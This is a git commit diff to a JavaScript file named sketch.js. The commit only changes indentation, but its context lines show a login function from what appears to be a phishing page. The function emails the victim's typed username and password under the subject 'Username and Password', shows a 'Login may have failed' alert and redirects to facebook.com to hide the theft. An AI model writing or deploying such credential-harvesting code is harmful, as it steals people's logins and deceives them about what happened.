16cd8e2ddf0eabdcef45a0285f26caa46786ad6e
passduck <67808602+passduck@users.noreply.github.com>
2020-07-05 13:58:48 -0400

    Update sketch.js

--- sketch.js
+++ sketch.js
@@ -74,7 +74,7 @@ function login() {
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br><br>Password " + password.value()
   }).then(
-    alert('Login may have failed');
+      alert('Login may have failed');
       window.location.replace("http://facebook.com");
   );
 }
